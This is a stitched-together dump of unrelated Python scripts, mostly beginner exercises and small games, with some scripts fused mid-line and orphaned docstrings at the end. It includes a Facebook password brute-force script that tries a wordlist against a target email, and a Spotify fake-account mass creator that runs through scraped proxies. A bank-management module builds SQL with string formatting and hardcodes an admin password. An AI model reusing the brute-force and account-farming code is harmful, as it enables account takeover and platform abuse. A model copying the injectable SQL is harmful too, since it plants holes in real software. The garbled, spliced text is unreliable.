f.writelines(["I love C++\n","I love scala"])
f.close()
with open("funny.txt","r") as f:
    for line in f:
        print(line)
player_scores = {}
with open("scores.csv","r") as f:
    for line in f:
        tokens = line.split(',')
        player = tokens[0]
        score = int(tokens[1])
        if player in player_scores:
            player_scores[player].append(score)
        else:
            player_scores[player] = [score]
print(player_scores)
for player, score_list in player_scores.items():
    min_score=min(score_list)
    max_score=max(score_list)
    avg_score=sum(score_list)/len(score_list)
    print(f"{player}==>Min:{min_score}, Max:{max_score}, Avg:{avg_score}")
import argparse
if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--number1", help="first number")
    parser.add_argument("--number2", help="second number")
    parser.add_argument("--operation", help="operation", \
                        choices=["add","subtract","multiply"])
    args = parser.parse_args()
    print(args.number1)
    print(args.number2)
    print(args.operation)
    n1=int(args.number1)
    n2=int(args.number2)
    result = None
    if args.operation == "add":
        result=n1+n2
    elif args.operation == "subtract":
        result=n1-n2
    elif args.operation == "multiply":
        result=n1*n2
    print("Result:",result)import argparse
import sys
import socket
import psutil
def python_version():
    return sys.version_info
def ip_addresses():
    hostname = socket.gethostname()
    addresses = socket.getaddrinfo(hostname, None)
    address_info = []
    for address in addresses:
        address_info.append((address[0].name, address[4][0]))
    return address_info
def cpu_load():
    return psutil.cpu_percent(interval=0.1)
def ram_available():
    return psutil.virtual_memory().available
def ac_connected():
    return psutil.sensors_battery().power_plugged
def show_sensors():
    print("Python Version:{0.major}.{0.minor}".format(python_version()))
    for address in ip_addresses():
        print("IP Addresses: {0[1]} ({0[0]})".format(address))
    print("CPU Load: {:.1f}".format(cpu_load()))
    print("RAM Available: {} MiB".format(ram_available() / 1024**2))
    print("AC Connected: {}".format(ac_connected()))
def command_line(argv):
    parser = argparse.ArgumentParser(
        description='Display the values of the sensors',add_help=True,
    )
    arguments = parser.parse_args()
    show_sensors()
if __name__ == '__main__':
    command_line(sys.argv)
import platform
import random
import string
import threading
import time
from os import system
import requests
if platform.system() == "Windows":  
    title = "windows"
else:
    title = "linux"
def randomName(size=10, chars=string.ascii_letters + string.digits):
    return ''.join(random.choice(chars) for i in range(size))
def randomPassword(size=14, chars=string.ascii_letters + string.digits):
    return ''.join(random.choice(chars) for i in range(size))
global maxi
global created
created = 0
errors = 0
class proxy():
    def update(self):
        while True:
            data = ''
            urls = ["https://api.proxyscrape.com/?request=getproxies&proxytype=socks4&timeout=10000&ssl=yes"]
            for url in urls:
                data += requests.get(url).text
                self.splited += data.split("\r\n") 
            time.sleep(600)
    def get_proxy(self):
        random1 = random.choice(self.splited) 
        return random1
    def FormatProxy(self):
	    proxyOutput = {'https' :'socks4://'+self.get_proxy()}
	    return proxyOutput
    def __init__(self):
        self.splited = []
        threading.Thread(target=self.update).start()
        time.sleep(3)
proxy1 = proxy()
def creator():
    global maxi
    global created
    global errors
    while maxi > created:
        if title == "windows":
            system("title "+ f"Spotify Account Creator by KevinLage https://github.com/KevinLage/Spotify-Account-Creator Created: {created}/{maxi} Errors:{errors}")
        s = requests.session()
        email = randomName()
        password = randomPassword()
        data={
        "displayname":"Josh",
        "creation_point":"https://login.app.spotify.com?utm_source=spotify&utm_medium=desktop-win32&utm_campaign=organic",
        "birth_month":"12",
        "email":email + "@gmail.com",
        "password":password,
        "creation_flow":"desktop",
        "platform":"desktop",
        "birth_year":"1991",
        "iagree":"1",
        "key":"4c7a36d5260abca4af282779720cf631",
        "birth_day":"17",
        "gender":"male",
        "password_repeat":password,
        "referrer":""
        }
        try:
            r = s.post("https://spclient.wg.spotify.com/signup/public/v1/account/",data=data,proxies=proxy1.FormatProxy())
            if '{"status":1,"' in r.text:
                open("created.txt", "a+").write(email + "@gmail.com:" + password + "\n")
                created += 1
                if title == "windows":
                    system("title "+ f"Spotify Account Creator : {created}/{maxi} Errors:{errors}")
            else:
                errors += 1
        except:
            pass
maxi = int(input("How many accounts do you want to create?\n"))
maxthreads = int(input("How many Threads?\n"))
num = 0
while num < maxthreads:
    num += 1
    threading.Thread(target=creator).start()  
from random import randint
from threading import Thread
from Background import Background
from Bird import Bird
from PIL.Image import open as openImage
from PIL.ImageTk import PhotoImage
class Tubes(Thread):
    __distance = 0
    __move = 10
    __pastTubes = []
    def __init__(self, background, bird, score_function=None, *screen_geometry, fp=("tube.png", "tube_mourth"),
                 animation_speed=50):
        if not isinstance(background, Background): raise TypeError(
            "The background argument must be an instance of Background.")
        if not len(fp) == 2: raise TypeError(
            "The parameter fp should be a sequence containing the path of the images of the tube body and the tube mouth.")
        if not isinstance(bird, Bird): raise TypeError("The birdargument must be an instance of Bird.")
        if not callable(score_function): raise TypeError("The score_function argument must be a callable object.")
        Thread.__init__(self)
        self.__background = background
        self.image_path = fp
        self.__animation_speed = animation_speed
        self.__score_method = score_function
        self.__width = screen_geometry[0]
        self.__height = screen_geometry[1]
        self.__bird_w = bird.width
        self.__bird_h = bird.height
        self.__imageWidth = (self.__width // 100) * 10
        self.__imageHeight = (self.__height // 100) * 5
        try:
            self.deleteAll()
        except BaseException:
            self.__background.tubeImages = []
        self.__background.tubeImages.append([])
        self.__background.tubeImages.append(
            self.getPhotoImage(
                image_path=self.image_path[1],
                width=self.__imageWidth,
                height=self.__imageHeight,
                closeAfter=True)[0]
        )
        self.__background.tubeImages.append(
            self.getPhotoImage(
                image_path=self.image_path[0],
                width=self.__imageWidth,
                height=self.__imageHeight)[1]
        )
        self.__minDistance = int(self.__imageWidth * 4.5)
        self.__stop = False
        self.__tubes = []
    def createNewTubes(self):
        tube1 = []
        width = self.__width + (self.__imageWidth)
        height = randint(self.__imageHeight // 2, self.__height - (self.__bird_h * 2) - self.__imageHeight)
        tube1.append(self.__background.create_image(width, height, image=self.__background.tubeImages[1]))
        self.__background.tubeImages[0].append(
            [self.getPhotoImage(image=self.__background.tubeImages[2], width=self.__imageWidth, height=height)[0], ]
        )
        y = (height // 2) + 1 - (self.__imageHeight // 2)
        tube1.append(self.__background.create_image(width, y, image=self.__background.tubeImages[0][-1][0]))
        tube2 = []
        height = height + (self.__bird_h * 2) + self.__imageHeight - 1
        tube2.append(self.__background.create_image(width, height, image=self.__background.tubeImages[1]))
        height = self.__height - height
        self.__background.tubeImages[0][-1].append(
            self.getPhotoImage(image=self.__background.tubeImages[2], width=self.__imageWidth, height=height)[0]
        )
        y = (self.__height - (height // 2)) + self.__imageHeight // 2
        tube2.append(self.__background.create_image(width, y, image=self.__background.tubeImages[0][-1][1]))
        self.__tubes.append([tube1, tube2])
        self.__distance = 0
    def deleteAll(self):
        for tubes in self.__tubes:
            for tube in tubes:
                for body in tube:
                    self.__background.delete(body)
        self.__background.clear()
        self.__background.tubeImages.clear()
    def getPhotoImage(image=None, image_path=None, width=None, height=None, closeAfter=False):
        if not image:
            if not image_path: return
            image = openImage(image_path)
        if not width: width = image.width
        if not height: height = image.height
        newImage = image.resize([width, height])
        photoImage = PhotoImage(newImage)
        if closeAfter:
            newImage.close()
            newImage = None
            image.close()
            image = None
        return photoImage, newImage, image
    def move(self):
        scored = False
        for tubes in self.__tubes:
            for tube in tubes:
                if not scored:
                    x2 = self.__background.bbox(tube[0])[2]
                    if (self.__width / 2) - (self.__bird_w / 2) - self.__move < x2:
                        if x2 <= (self.__width / 2) - (self.__bird_w / 2):
                            if not tube[0] in self.__pastTubes:
                                self.__score_method()
                                self.__pastTubes.append(tube[0])
                                scored = True
                for body in tube:
                    self.__background.move(body, -self.__move, 0)
    def run(self):
        if self.__stop: return
        if len(self.__tubes) >= 1 and self.__background.bbox(self.__tubes[0][0][0])[2] <= 0:
            for tube in self.__tubes[0]:
                for body in tube:
                    self.__background.delete(body)
            self.__background.tubeImages[0].remove(self.__background.tubeImages[0][0])
            self.__tubes.remove(self.__tubes[0])
            self.__pastTubes.remove(self.__pastTubes[0])
        if self.__distance >= self.__minDistance:
            self.createNewTubes()
        else:
            self.__distance += self.__move
        self.move()
        self.__background.after(self.__animation_speed, self.run)
    def stop(self):
        self.__stop = True
from bs4 import BeautifulSoup
import requests
def check_sign():
    your_birth_day = input("enter your birthday day number> ")
    your_birth_month = input("cool, and the month number, please> ")
    if (int(your_birth_month) == 12 and int(your_birth_day) >= 22) or (
        int(your_birth_month) == 1 and int(your_birth_day) <= 19
    ):
        sign = "Capricorn"
    elif (int(your_birth_month) == 1 and int(your_birth_day) >= 20) or (
        int(your_birth_month) == 2 and int(your_birth_day) <= 17
    ):
        sign = "Aquarium"
    elif (int(your_birth_month) == 2 and int(your_birth_day) >= 18) or (
        int(your_birth_month) == 3 and int(your_birth_day) <= 19
    ):
        sign = "Pices"
    elif (int(your_birth_month) == 3 and int(your_birth_day) >= 20) or (
        int(your_birth_month) == 4 and int(your_birth_day) <= 19
    ):
        sign = "Aries"
    elif (int(your_birth_month) == 4 and int(your_birth_day) >= 20) or (
        int(your_birth_month) == 5 and int(your_birth_day) <= 20
    ):
        sign = "Taurus"
    elif (int(your_birth_month) == 5 and int(your_birth_day) >= 21) or (
        int(your_birth_month) == 6 and int(your_birth_day) <= 20
    ):
        sign = "Gemini"
    elif (int(your_birth_month) == 6 and int(your_birth_day) >= 21) or (
        int(your_birth_month) == 7 and int(your_birth_day) <= 22
    ):
        sign = "Cancer"
    elif (int(your_birth_month) == 7 and int(your_birth_day) >= 23) or (
        int(your_birth_month) == 8 and int(your_birth_day) <= 22
    ):
        sign = "Leo"
    elif (int(your_birth_month) == 8 and int(your_birth_day) >= 23) or (
        int(your_birth_month) == 9 and int(your_birth_day) <= 22
    ):
        sign = "Virgo"
    elif (int(your_birth_month) == 9 and int(your_birth_day) >= 23) or (
        int(your_birth_month) == 10 and int(your_birth_day) <= 22
    ):
        sign = "Libra"
    elif (int(your_birth_month) == 10 and int(your_birth_day) >= 23) or (
        int(your_birth_month) == 11 and int(your_birth_day) <= 21
    ):
        sign = "Scorpio"
    elif (int(your_birth_month) == 11 and int(your_birth_day) >= 22) or (
        int(your_birth_month) == 12 and int(your_birth_day) <= 21
    ):
        sign = "Sagittarius"
    return sign
def horoscope(zodiac_sign: int, day: str) -> str:
    url = (
        "https://www.horoscope.com/us/horoscopes/general/"
        f"horoscope-general-daily-{day}.aspx?sign={zodiac_sign}"
    )
    soup = BeautifulSoup(requests.get(url).content, "html.parser")
    return soup.find("div", class_="main-horoscope").p.text
if __name__ == "__main__":
    print("Daily Horoscope. \n")
    print(
        "enter your Zodiac sign number:\n",
        "1. Aries\n",
        "2. Taurus\n",
        "3. Gemini\n",
        "4. Cancer\n",
        "5. Leo\n",
        "6. Virgo\n",
        "7. Libra\n",
        "8. Scorpio\n",
        "9. Sagittarius\n",
        "10. Capricorn\n",
        "11. Aquarius\n",
        "12. Pisces\n",
        "\nor if you're not sure about you sign, type 'calculate'",
    )
    zodiac_sign = input("number> ")
    if zodiac_sign != "calculate":
        print("choose some day:\n", "yesterday\n", "today\n", "tomorrow\n")
        day = input("enter the day> ")
        horoscope_text = horoscope(zodiac_sign, day)
        print(horoscope_text)
    else:
        print("\nOk, don't worry. Soon you'll get it just pass this tiny quiz")
        print("\nCongratulations! you are defenetly", check_sign())
import sqlite3
def connect_database():
    global conn
    global cur
    conn = sqlite3.connect("bankmanaging.db")
    cur = conn.cursor()
    cur.execute(
        "create table if not exists bank (acc_no int, name text, age int, address text, balance int, account_type text, mobile_number int)")
    cur.execute("create table if not exists staff (name text, pass text,salary int, position text)")
    cur.execute("create table if not exists admin (name text, pass text)")
    cur.execute("insert into admin values('arpit','123')")
    conn.commit()
    cur.execute("select acc_no from bank")
    acc = cur.fetchall()
    global acc_no
    if len(acc) == 0:
        acc_no = 1
    else:
        acc_no = int(acc[-1][0]) + 1
def check_admin(name, password):
    cur.execute("select * from admin")
    data = cur.fetchall()
    if data[0][0] == name and data[0][1] == password:
        return True
    return
def create_employee(name, password, salary, positon):
    print(password)
    cur.execute("insert into staff values(?,?,?,?)", (name, password, salary, positon))
    conn.commit()
def check_employee(name, password):
    print(password)
    print(name)
    cur.execute("select name,pass from staff")
    data = cur.fetchall()
    print(data)
    if len(data) == 0:
        return False
    for i in range(len(data)):
        if data[i][0] == name and data[i][1] == password:
            return True
    return False
def create_customer(name, age, address, balance, acc_type, mobile_number):
    global acc_no
    cur.execute("insert into bank values(?,?,?,?,?,?,?)",
                (acc_no, name, age, address, balance, acc_type, mobile_number))
    conn.commit()
    acc_no = acc_no + 1
    return acc_no - 1
def check_acc_no(acc_no):
    cur.execute("select acc_no from bank")
    list_acc_no = cur.fetchall()
    for i in range(len(list_acc_no)):
        if list_acc_no[i][0] == int(acc_no):
            return True
    return False
def get_details(acc_no):
    cur.execute("select * from bank where acc_no=?", (acc_no))
    global detail
    detail = cur.fetchall()
    print(detail)
    if len(detail) == 0:
        return False
    else:
        return (detail[0][0], detail[0][1], detail[0][2], detail[0][3], detail[0][4], detail[0][5], detail[0][6])
def update_balance(new_money, acc_no):
    cur.execute("select balance from bank where acc_no=?", (acc_no,))
    bal = cur.fetchall()
    bal = bal[0][0]
    new_bal = bal + int(new_money)
    cur.execute("update bank set balance=? where acc_no=?", (new_bal, acc_no))
    conn.commit()
def deduct_balance(new_money, acc_no):
    cur.execute("select balance from bank where acc_no=?", (acc_no,))
    bal = cur.fetchall()
    bal = bal[0][0]
    if bal < int(new_money):
        return False
    else:
        new_bal = bal - int(new_money)
        cur.execute("update bank set balance=? where acc_no=?", (new_bal, acc_no))
        conn.commit()
        return True
def check_balance(acc_no):
    cur.execute("select balance from bank where acc_no=?", (acc_no))
    bal = cur.fetchall()
    return bal[0][0]
def update_name_in_bank_table(new_name, acc_no):
    print(new_name)
    conn.execute("update bank set name='{}' where acc_no={}".format(new_name, acc_no))
    conn.commit()
def update_age_in_bank_table(new_name, acc_no):
    print(new_name)
    conn.execute("update bank set age={} where acc_no={}".format(new_name, acc_no))
    conn.commit()
def update_address_in_bank_table(new_name, acc_no):
    print(new_name)
    conn.execute("update bank set address='{}' where acc_no={}".format(new_name, acc_no))
    conn.commit()
def list_all_customers():
    cur.execute("select * from bank")
    deatil = cur.fetchall()
    return deatil
def delete_acc(acc_no):
    cur.execute("delete from bank where acc_no=?", (acc_no))
    conn.commit()
def show_employees():
    cur.execute("select name, salary, position,pass from staff")
    detail = cur.fetchall()
    return detail
def all_money():
    cur.execute("select balance from bank")
    bal = cur.fetchall()
    print(bal)
    if len(bal) == 0:
        return False
    else:
        total = 0
        for i in bal:
            total = total + i[0]
        return total
def show_employees_for_update():
    cur.execute("select * from staff")
    detail = cur.fetchall()
    return detail
def update_employee_name(new_name, old_name):
    print(new_name, old_name)
    cur.execute("update staff set name='{}' where name='{}'".format(new_name, old_name))
    conn.commit()
def update_employee_password(new_pass, old_name):
    print(new_pass, old_name)
    cur.execute("update staff set pass='{}' where name='{}'".format(new_pass, old_name))
    conn.commit()
def update_employee_salary(new_salary, old_name):
    print(new_salary, old_name)
    cur.execute("update staff set salary={} where name='{}'".format(new_salary, old_name))
    conn.commit()
def update_employee_position(new_pos, old_name):
    print(new_pos, old_name)
    cur.execute("update staff set position='{}' where name='{}'".format(new_pos, old_name))
    conn.commit()
def get_detail(acc_no):
    cur.execute("select name, balance from bank where acc_no=?", (acc_no))
    details = cur.fetchall()
    return details
def check_name_in_staff(name):
    cur = conn.cursor()
    cur.execute("select name from staff")
    details = cur.fetchall()
    for i in details:
        if i[0] == name:
            return True
    return False
import random
choices = {'S':'Snake','W':'Water','G':'Gun'}
x = 0
comp_point = 0
user_point = 0
match_draw = 0
print('Welcome to the Snake-Water-Gun Game\n')
print('I am Mr. Computer, We will play this game 10 times')
print('Whoever wins more matches will be the winner\n')
while x < 10:
    print(f'Game No. {x+1}')
    for key, value in choices.items():
        print(f'Choose {key} for {value}')
    comp_rand = random.choice(list(choices.keys())).lower()
    user_choice = input('\n----->').lower()
    print("Mr. Computer's choice is : " + comp_rand)
    if comp_rand == 's':
        if user_choice == 'w':
            print("\n-------Mr. Computer won this round--------")
            comp_point += 1
            x += 1
        elif user_choice == 'g':
            print("\n-------You won this round-------")
            user_point += 1
            x += 1
        else:
            print("\n-------Match draw-------")
            match_draw +=1
            x += 1
    elif comp_rand == 'w':
        if user_choice == 'g':
            print("\n-------Mr. Computer won this round--------")
            comp_point += 1
            x += 1
        elif user_choice == 's':
            print("\n-------You won this round-------")
            user_point += 1
            x += 1
        else:
            print("\n-------Match draw-------")
            match_draw +=1
            x += 1
    elif comp_rand == 'g':
        if user_choice == 's':
            print("\n-------Mr. Computer won this round--------")
            comp_point += 1
            x += 1
        elif user_choice == 'w':
            print("\n-------You won this round-------")
            user_point += 1
            x += 1
        else:
            print("\n-------Match draw-------")
            match_draw +=1
            x += 1
print('Here are final stats of the 10 matches : ')
print(f'Mr. Computer won : {comp_point} matches')
print(f'You won : {user_point} matches')
print(f'Matches Drawn : {match_draw}')
if comp_point > user_point:
    print('\n-------Mr. Computer won-------')
elif comp_point < user_point:
    print('\n-----------You won-----------')
else:
    print('\n----------Match Draw----------')
import pyautogui  
from PIL import Image, ImageGrab  
import time
def hit(key):
    pyautogui.press(key)
    return
def isCollide(data):
    for i in range(329, 425):
        for j in range(550, 650):
            if data[i, j] < 100:
                hit("up")
                return
if __name__ == "__main__":
    print("Hey.. Dino game about to start in 3 seconds")
    time.sleep(2)
    while True:
        image = ImageGrab.grab().convert('L')
        data = image.load()
        isCollide(data)
def pascal_triangle(lineNumber):
    list1 = list()
    list1.append([1])
    i = 1
    while (i <= lineNumber):
        j = 1
        l = []
        l.append(1)
        while (j < i):
            l.append(list1[i - 1][j] + list1[i - 1][j - 1])
            j = j + 1
        l.append(1)
        list1.append(l)
        i = i + 1
    return list1
def binomial_coef(n, k):
    pascalTriangle = pascal_triangle(n)
    return (pascalTriangle[n][k - 1])
import collections
import pprint
def main():
    file_input = input('File Name: ')
    try:
        with open(file_input, 'r') as info:
            count = collections.Counter(info.read().upper())
    except FileNotFoundError:
        print("Please enter a valid file name.")
        main()
    value = pprint.pformat(count)
    print(value)
    exit()
if __name__ == "__main__":
    main()
from appJar import gui 
p = gui()
p.setSize(300,200)
p.setBg('green')
p.go()
import pyglet
from pong import load
WIDTH = 600   
HEIGHT = 600  
BORDER = 10   
RADIUS = 12   
PWIDTH = 120  
PHEIGHT = 15  
ballspeed = (-2, -2)    
paddleacc = (-5, 5)   
class PongPongWindow(pyglet.window.Window):
    def __init__(self, *args, **kwargs):
        super(PongPongWindow, self).__init__(*args, **kwargs)
        self.win_size = (WIDTH, HEIGHT)
        self.paddle_pos = (WIDTH/2-PWIDTH/2, 0)
        self.main_batch = pyglet.graphics.Batch()
        self.walls = load.load_rectangles(self.win_size, BORDER, batch=self.main_batch)
        self.balls = load.load_balls(self.win_size, RADIUS, speed=ballspeed, batch=self.main_batch)
        self.paddles = load.load_paddles(self.paddle_pos, PWIDTH, PHEIGHT, acc=paddleacc, batch=self.main_batch)
    def on_draw(self):
        self.clear()
        self.main_batch.draw()
game_window = PongPongWindow(width=WIDTH, height=HEIGHT, caption='PongPong')
game_objects = game_window.balls + game_window.paddles
for paddle in game_window.paddles:
    for handler in paddle.event_handlers:
        game_window.push_handlers(handler)
def update(dt):
    global game_objects, game_window
    for obj1 in game_objects:
        for obj2 in game_objects:
            if obj1 is obj2:
                continue
            obj1.update(game_window.win_size, BORDER, obj2, dt)
if __name__ == '__main__':
    pyglet.clock.schedule_interval(update, 1/120.0)
    pyglet.app.run()
def text_file_replace(file, encoding, old, new):
    lines = []
    cnt = 0
    with open(file=file, mode='r', encoding=encoding) as fd:
        for line in fd:
            cnt += line.count(old)
            lines.append(line.replace(old, new))
    with open(file=file, mode='w', encoding=encoding) as fd:
        fd.writelines(lines)
    print("{} occurence(s) of \"{}\" have been replaced with \"{}\"".format(cnt, old, new))
    return cnt
if __name__ == '__main__':
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument("-f", "--file", help = "File.")
    parser.add_argument("-e", "--encoding", default='utf-8', help = "Encoding.")
    parser.add_argument("-o", "--old", help = "Old string.")
    parser.add_argument("-n", "--new", help = "New string.")
    args = parser.parse_args()
    text_file_replace(args.file, args.encoding, args.old, args.new)
x,li,small,maxx,c = input(),list(),0,0,1
for i in range(len(x)):
               li.append(int(x[i]))
for i in range(len(li)-1,-1,-1):
    if(i==0):
        print("No Number Possible")
        c=0
        break
    if(li[i]>li[i-1]):
        small = i-1
        maxx = i
        break
for i in range(small+1,len(li)):
    if(li[i]>li[small] and li[i]<li[maxx]):
        maxx = i
li[small],li[maxx]=li[maxx],li[small]
li = li[:small+1] + sorted(li[small+1:])
if(c):
    for i in range(len(li)):
        print(li[i],end = '' )
def fib(n):
   if n == 0 or n == 1:
       return n
   else:
       return(fib(n-1) + fib(n-2))
import requests
import threading
import urllib.request
import os
from bs4 import BeautifulSoup
import sys
if sys.version_info[0] !=3: 
	sys.exit()
post_url='https://www.facebook.com/login.php'
headers = {
	'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
}
payload={}
cookie={}
def create_form():
	form=dict()
	cookie={'fr':'0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy'}
	data=requests.get(post_url,headers=headers)
	for i in data.cookies:
		cookie[i.name]=i.value
	data=BeautifulSoup(data.text,'html.parser').form
	if data.input['name']=='lsd':
		form['lsd']=data.input['value']
	return (form,cookie)
def function(email,passw,i):
	global payload,cookie
	if i%10==1:
		payload,cookie=create_form()
		payload['email']=email
	payload['pass']=passw
	r=requests.post(post_url,data=payload,cookies=cookie,headers=headers)
	if 'Find Friends' in r.text or 'Two-factor authentication required' in r.text:
		open('temp','w').write(str(r.content))
		print('\npassword is : ',passw)
		return True
	return False
print('\n---------- Welcome To Facebook BruteForce ----------\n')
file=open('passwords.txt','r')
email=input('Enter Email/Username : ')
print("\nTarget Email ID : ",email)
print("\nTrying Passwords from list ...")
i=0
while file:
	passw=file.readline().strip()
	i+=1
	if passw < 6:
		continue
	print(str(i) +" : ",passw)
	if function(email,passw,i):
		break
class Conversion:
    def __init__(self, capacity):
        self.top = -1
        self.capacity = capacity
        self.array = []
        self.output = []
        self.precedence = {'+': 1, '-': 1, '*': 2, '/': 2, '^': 3}
    def isEmpty(self):
        return True if self.top == -1 else False
    def peek(self):
        return self.array[-1]
    def pop(self):
        if not self.isEmpty():
            self.top -= 1
            return self.array.pop()
        else:
            return "$"
    def push(self, op):
        self.top += 1
        self.array.append(op)
    def isOperand(self, ch):
        return ch.isalpha()
    def notGreater(self, i):
        try:
            a = self.precedence[i]
            b = self.precedence[self.peek()]
            return True if a <= b else False
        except KeyError:
            return False
    def infixToPostfix(self, exp):
        for i in exp:
            if self.isOperand(i):
                self.output.append(i)
            elif i == '(':
                self.push(i)
            elif i == ')':
                while ((not self.isEmpty()) and self.peek() != '('):
                    a = self.pop()
                    self.output.append(a)
                if (not self.isEmpty() and self.peek() != '('):
                    return -1
                else:
                    self.pop()
            else:
                while (not self.isEmpty() and self.notGreater(i)):
                    self.output.append(self.pop())
                self.push(i)
        while not self.isEmpty():
            self.output.append(self.pop())
        print("".join(self.output))
exp = "a+b*(c^d-e)^(f+g*h)-i"
obj = Conversion(len(exp))
obj.infixToPostfix(exp)
def swap_case(s):
    return s.swapcase()
if __name__ == '__main__':
    s = input()
    result = swap_case(s)
    print(result)
from random import randint
from tkinter import *
def roll():
    text.delete(0.0, END)
    text.insert(END, str(randint(1, 100)))
window = Tk()
text = Text(window, width=3, height=1)
buttonA = Button(window, text="Press to roll!", command=roll)
text.pack()
buttonA.pack()
from flask import *
import pandas as pd
import os
import re
app = Flask(__name__)
def show_tables():
    filename = 'example2.xlsx'
    data = pd.read_excel(filename,sheetname='Sheet1')
    data = data.fillna('')
    return render_template('index.html',tables=[re.sub(' mytable', '" id="example', data.to_html(classes='mytable'))],
    titles = ['Excel Data to Flask'])
def insert():
    q1 = request.form['num1']
    q2 = request.form['num2']
    print(q1,q2)
    df = pd.DataFrame({'a': [q1],
                       'b': [q2]})
    book = pd.read_excel('example2.xlsx')
    writer = pd.ExcelWriter('example2.xlsx', engine='openpyxl')
    book.to_excel(writer, startrow=0, index=False)
    df.to_excel(writer, startrow=len(book) + 1, header=False, index=False)
    writer.save()
    return redirect('/')
def save():
    url = 'http://127.0.0.1:5000/'
    urll = request.get_data()
    print(urll)
    data = pd.read_html(urll)
    print(data)
    writer = pd.ExcelWriter('example2.xlsx', engine='openpyxl')
    data[0].drop('Unnamed: 0', axis=1).to_excel(writer, sheet_name='Sheet1', index=False)
    writer.save()
    return redirect('/')
if __name__ == "__main__":
    app.run(debug=True)
def Binary_Search(Test_arr, low, high, k):
    if high >= low:
        Mid = (low+high)//2
        if Test_arr[Mid] < k:
            return Binary_Search(Test_arr, Mid+1, high, k)
        elif Test_arr[Mid] > k:
            return Binary_Search(Test_arr, low, Mid-1, k)
        else:
            return Mid
    else:
        return low
def Insertion_Sort(Test_arr):
    for i in range(1, len(Test_arr)):
        val = Test_arr[i]
        j = Binary_Search(Test_arr[:i], 0, len(Test_arr[:i])-1, val)
        Test_arr.pop(i)
        Test_arr.insert(j, val)
    return Test_arr
if __name__ == "__main__":
    Test_list = input("Enter the list of Numbers: ").split()
    Test_list = [int(i) for i in Test_list]
import re
pattern = re.compile("\W") 
wordlist = wordstring.split() 
for x, y in enumerate(wordlist):
    special_character = pattern.search(y[-1:]) 
    try:
        if special_character.group():  
            wordlist[x] = y[:-1]
    except BaseException:
        continue
wordfreq = [wordlist.count(w) for w in wordlist]  
print("String\n {} \n".format(wordstring))
print("List\n {} \n".format(str(wordlist)))
print("Frequencies\n {} \n".format(str(wordfreq)))
print("Pairs\n {}".format(str(dict(zip(wordlist, wordfreq)))))
import pygame as pg
from .checker_board import *
from .statics import *
from .pieces import *
class checker:
    def __init__(self, window):
        self._init()
        self.window = window
    def update (self):
        self.board.draw(self.window)
        self.draw_moves(self.valid_moves)
        pg.display.update()
    def _init(self):
        self.select = None
        self.board = checker_board()
        self.turn = black
        self.valid_moves = {}
    def reset (self):
        self._init()
    def selectrc(self, row, col):
        if (self.select):
            result = self._move(row, col)
            if (not result):
                self.select = None
        piece = self.board.get_piece(row, col)
        if ((piece != 0) and (piece.color == self.turn)):
            self.select = piece
            self.valid_moves = self.board.get_valid_moves(piece)
            return True
        return False
    def _move(self, row, col):
        piece = self.board.get_piece(row, col)
        if ((self.select) and (piece == 0) and (row, col) in self.valid_moves):
            self.board.move(self.select, row, col)
            skip = self.valid_moves[(row, col)]
            if (skip):
                self.board.remove(skip)
            self.chg_turn()
        else:
            return False
        return True
    def draw_moves (self, moves):
        for move in moves:
            row, col = move
            pg.draw.circle(self.window, red, (col * sq_size + sq_size // 2, row * sq_size + sq_size // 2), 15)
    def chg_turn (self):
        self.valid_moves = {}
        if (self.turn == black):
            self.turn = white
        else:
            self.turn = blackimport time
import speech_recognition as sr
import os
import playsound
import shutil
shutil.rmtree('spoken')
os.mkdir('spoken')
speeches = []
def callback(recognizer, audio):
    with open('spoken/'+str(len(speeches))+'.wav','wb') as file:
        file.write(audio.get_wav_data())
    playsound.playsound('spoken/'+str(len(speeches))+'.wav')
    speeches.append(1)
    print('____')
r = sr.Recognizer()
m = sr.Microphone()
with m as source:
    r.adjust_for_ambient_noise(source)
stop_listening = r.listen_in_background(m, callback)
print('say:')
while True: time.sleep(0.1)
phrase = input()
if phrase == phrase[::-1]:  
Commands:
    generate password ->
    <lenght of the password>
commands to change the characters to be used to generate passwords:
{list_to_vertical_string(Interface.has_characters.keys())}
    Classe para gerar um plano de fundo animado
        Retorna os id's das imagens de background
        Retorna um objeto da classe PIL.ImageTk.PhotoImage de uma imagem e as imagens criadas de PIL.Image 
        (photoImage, new, original)
        @param image: Instância de PIL.Image.open
        @param image_path: Diretório da imagem
        @param width: Largura da imagem
        @param height: Altura da imagem
        @param closeAfter: Se True, a imagem será fechada após ser criado um PhotoImage da mesma
        Método para resetar o background, apagando todos os itens que não sejam o plano de fundo
        Método para iniciar a animação do background
        Método para parar a animação do background
    Classe principal do jogo onde tudo será executado
        Método para colocar o jogo no modo "fullscreen" ou "window"
        Método para fechar o jogo
        Método para criar os botões de menu
        Método para criar a imagem do placar do jogo no background 
        junto com as informações do jogador.
        Método para criar a imagem do título do jogo no background
        Método para deletar os botões de menu 
        Método de fim de jogo
        Método para aumentar a pontuação do jogo atual do jogador
        Método para iniciar o programa em si, criando toda a parte gráfica inicial do jogo
        Método para carregar a pontuação do jogador
        Método para salvar a pontuação do jogador
        Método para inicializar o jogo
	author: Christian Bender
	date: 21.12.2017
	class: XORCipher
	This class implements the XOR-cipher algorithm and provides
	some useful methods for encrypting and decrypting strings and
	files.
	Overview about methods
	- encrypt : list of char
	- decrypt : list of char
	- encrypt_string : str
	- decrypt_string : str
	- encrypt_file : boolean
	- decrypt_file : boolean
            simple constructor that receives a key or uses
            default key = 0
            input: 'content' of type string and 'key' of type int
            output: encrypted string 'content' as a list of chars
            if key not passed the method uses the key by the constructor.
            otherwise key = 1
            input: 'content' of type list and 'key' of type int
            output: decrypted string 'content' as a list of chars
            if key not passed the method uses the key by the constructor.
            otherwise key = 1
            input: 'content' of type string and 'key' of type int
            output: encrypted string 'content'
            if key not passed the method uses the key by the constructor.
            otherwise key = 1
            input: 'content' of type string and 'key' of type int
            output: decrypted string 'content'
            if key not passed the method uses the key by the constructor.
            otherwise key = 1
            input: filename (str) and a key (int)
            output: returns true if encrypt process was
            successful otherwise false
            if key not passed the method uses the key by the constructor.
            otherwise key = 1
            input: filename (str) and a key (int)
            output: returns true if decrypt process was
            successful otherwise false
            if key not passed the method uses the key by the constructor.
            otherwise key = 1
a simple terminal program to find new about certain topic by web scraping site.
site used :
1. Times of India,
